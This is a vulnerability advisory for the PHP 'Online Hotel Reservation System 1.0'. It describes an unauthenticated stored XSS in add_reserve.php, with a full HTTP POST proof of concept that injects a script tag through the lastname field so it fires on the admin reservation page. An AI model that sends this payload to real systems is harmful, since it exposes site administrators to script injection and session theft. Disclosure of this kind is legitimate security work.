## Online Hotel Reservation System has an XSS injection vulnerability

## Affected version:

Online Hotel Reservation System - 1.0

## Software:

https://code-projects.org/simple-online-hotel-reservation-system-in-php-with-source-code/

## Vulnerability File:

/HOR/add_reserve.php

## Description:

Any visitor user can send hotel reservation invitations containing XSS statements without logging in, exposing administrators to attacks when they view reservation orders.

Status: Moderate

POC

```
POST /HOR/add_reserve.php?room_id=6 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary94dbd00d4a9b5e0d7fcba4b66680e4b4
Content-Length: 879
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/HOR/add_reserve.php?room_id=6
Cookie: PHPSESSID=db5no8dvip725j5p64esp3qbge
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary94dbd00d4a9b5e0d7fcba4b66680e4b4
Content-Disposition: form-data; name="firstname"

xxxx
------geckoformboundary94dbd00d4a9b5e0d7fcba4b66680e4b4
Content-Disposition: form-data; name="middlename"

xxxx
------geckoformboundary94dbd00d4a9b5e0d7fcba4b66680e4b4
Content-Disposition: form-data; name="lastname"

<script>alert(123)</script>
------geckoformboundary94dbd00d4a9b5e0d7fcba4b66680e4b4
Content-Disposition: form-data; name="address"

xxxxx
------geckoformboundary94dbd00d4a9b5e0d7fcba4b66680e4b4
Content-Disposition: form-data; name="contactno"

xasfasf
------geckoformboundary94dbd00d4a9b5e0d7fcba4b66680e4b4
Content-Disposition: form-data; name="date"

xxx
------geckoformboundary94dbd00d4a9b5e0d7fcba4b66680e4b4
Content-Disposition: form-data; name="add_guest"


------geckoformboundary94dbd00d4a9b5e0d7fcba4b66680e4b4--
```

access the following path:

```
HOR/admin/reserve.php
```

image:

![image](https://github.com/foreverfeifei/HOR-CVE/blob/main/Pasted%20image%2020251021162023.png)
